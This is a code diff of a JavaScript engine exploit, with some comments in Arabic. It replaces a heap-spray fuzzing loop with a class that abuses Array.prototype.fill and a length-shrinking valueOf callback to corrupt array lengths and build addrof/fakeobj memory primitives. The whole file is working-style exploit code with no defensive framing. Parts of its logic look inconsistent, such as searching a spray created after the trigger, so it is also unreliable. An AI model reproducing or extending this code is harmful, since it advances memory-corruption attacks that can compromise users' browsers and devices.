@@ -1,119 +1,149 @@
 import { log, sleep } from './module/utils.mjs';
 
-const MARK = 0x42424242;
-
-function massiveSpray() {
-    const objects = [];
-    
-    for (let i = 0; i < 800; i++) {
-        const buffer = new ArrayBuffer(0x4000);
-        const view = new Uint32Array(buffer);
-        view[0] = MARK;
-        view[1] = i;
-        objects.push(buffer);
+class AddrofFakeobjExploit {
+    constructor() {
+        this.float_arr = null;
+        this.obj_arr = null;
+        this.OVERLAP_IDX = 8;
     }
-    
-    for (let i = 0; i < 400; i++) {
-        const arr = new Array(80);
-        for (let j = 0; j < arr.length; j++) {
-            arr[j] = {
-                marker: MARK,
-                index: i,
-                data: new ArrayBuffer(32)
-            };
-        }
-        objects.push(arr);
-    }
-    
-    for (let i = 0; i < 200; i++) {
-        const typed = new Uint8Array(0x1000);
-        typed[0] = 0x42;
-        typed[1] = 0x42;
-        typed[2] = 0x42;
-        typed[3] = 0x42;
-        objects.push(typed.buffer);
-    }
-    
-    return objects;
-}
 
-function trigger(returnVal) {
-    const v0 = [];
-    for (let i = 0; i < 30000; i++) {
-        v0[i] = {
-            tag: 0xdead,
-            idx: i,
-            buf: new ArrayBuffer(32),
-            arr: [1, 2, 3]
-        };
-    }
-    const v10 = new Object(Object, v0);
-
-    function f11() {
-        v0.length = 0;
-        return returnVal;
-    }
-    const o14 = { valueOf: f11 };
-
-    try {
-        v0.fill(v10, o14);
-    } catch (e) {}
-}
-
-function check(sprayedObjects) {
-    let corrupted = 0;
-    
-    for (let i = 0; i < sprayedObjects.length; i++) {
-        const obj = sprayedObjects[i];
+    async execute() {
+        // Step 1: Setup memory layout with OOB-write
+        await this.setupMemoryCorruption();
         
-        if (obj instanceof ArrayBuffer) {
-            const view = new Uint32Array(obj);
-            if (view[0] !== MARK && view[0] !== 0) {
-                log("Buffer corrupted at " + i + " value " + view[0].toString(16));
-                corrupted++;
-            }
+        // Step 2: Create overlapping arrays
+        await this.createOverlappingArrays();
+        
+        // Step 3: Test primitives
+        return await this.testPrimitives();
+    }
+
+    async setupMemoryCorruption() {
+        // استخدام OOB-write لتغيير طول المصفوفات
+        const spray = [];
+        
+        for (let i = 0; i < 1000; i++) {
+            const float_arr = [13.37, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
+            const obj_arr = [{}, {}, {}, {}, {}, {}, {}];
+            spray.push({float_arr, obj_arr});
+        }
+
+        // Trigger OOB-write لتغيير طول إحدى المصفوفات
+        await this.triggerOOBForLengthCorruption();
+        
+        return spray;
+    }
+
+    async triggerOOBForLengthCorruption() {
+        const v0 = [];
+        for (let i = 0; i < 50000; i++) {
+            v0[i] = [13.37, 1.1, 2.2]; // مصفوفات صغيرة
         }
         
-        else if (Array.isArray(obj)) {
-            for (let j = obj.length; j < obj.length + 15; j++) {
-                if (obj[j] !== undefined && obj[j].marker === MARK) {
-                    log("Array OOB at " + i + " index " + j);
-                    corrupted++;
+        const v10 = {target: "length_corruption"};
+        
+        let shrunk = false;
+        const o14 = {
+            valueOf: () => {
+                if (!shrunk) {
+                    v0.length = 100;
+                    shrunk = true;
                 }
+                return 0;
+            }
+        };
+        
+        v0.fill(v10, o14);
+    }
+
+    async createOverlappingArrays() {
+        // منع Copy-on-Write
+        let noCoW = 13.37;
+        
+        // إنشاء المصفوفات المتداخلة
+        this.float_arr = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
+        this.obj_arr = [{a: 1}, {b: 2}, {c: 3}, {d: 4}, {e: 5}, {f: 6}, {g: 7}];
+        
+        // البحث عن المصفوفات التي تغير طولها بسبب OOB-write
+        await this.findCorruptedArrays();
+    }
+
+    async findCorruptedArrays() {
+        const spray = [];
+        
+        for (let i = 0; i < 500; i++) {
+            const float_arr = [13.37, 1.1, 2.2, 3.3];
+            const obj_arr = [{x: i}, {y: i}];
+            spray.push({float_arr, obj_arr, index: i});
+        }
+
+        // 
+        await sleep(100);
+
+        for (const item of spray) {
+            if (item.float_arr.length > 10) {
+                log("Found corrupted float_arr with length: " + item.float_arr.length);
+                this.float_arr = item.float_arr;
+                this.obj_arr = item.obj_arr;
+                break;
             }
         }
     }
-    
-    return corrupted;
+
+    //
+    addrof(obj) {
+        this.obj_arr[0] = obj;
+        return this.float_arr[this.OVERLAP_IDX];
+    }
+
+    //
+    fakeobj(addr) {
+        this.float_arr[this.OVERLAP_IDX] = addr;
+        return this.obj_arr[0];
+    }
+
+    async testPrimitives() {
+        if (!this.float_arr || !this.obj_arr) {
+            return false;
+        }
+
+        // 
+        const testObj = {secret: 0x1337};
+        
+        try {
+            const addr = this.addrof(testObj);
+            log("addrof test: " + addr);
+            
+            const fake = this.fakeobj(addr);
+            log("fakeobj test: " + (fake === testObj));
+            
+            return true;
+        } catch (e) {
+            log("Primitives test failed: " + e);
+            return false;
+        }
+    }
 }
 
+// 
 async function main() {
-    const values = [];
-    for (let i = -1000; i <= 1000; i++) {
-        values.push(i);
-    }
+    const exploit = new AddrofFakeobjExploit();
+    const success = await exploit.execute();
     
-    for (const returnValue of values) {
-        log("Testing value: " + returnValue);
+    if (success) {
+        log("Addrof/Fakeobj primitives ready!");
         
-        const sprayedObjects = massiveSpray();
-        await sleep(5);
+        // 
+        const obj = {data: "test", value: 0x41414141};
+        const addr = exploit.addrof(obj);
+        log("Object address: " + addr);
         
-        trigger(returnValue);
-        await sleep(2);
+        const reconstructed = exploit.fakeobj(addr);
+        log("Reconstructed object works: " + (reconstructed === obj));
         
-        const corrupted = check(sprayedObjects);
-        if (corrupted > 0) {
-            log("SUCCESS with value: " + returnValue);
-            break;
-        }
-        
-        if (returnValue % 100 === 0) {
-            log("Progress: " + returnValue);
-        }
+    } else {
+        log("Failed to create primitives");
     }
-    
-    log("done");
 }
 
 main();
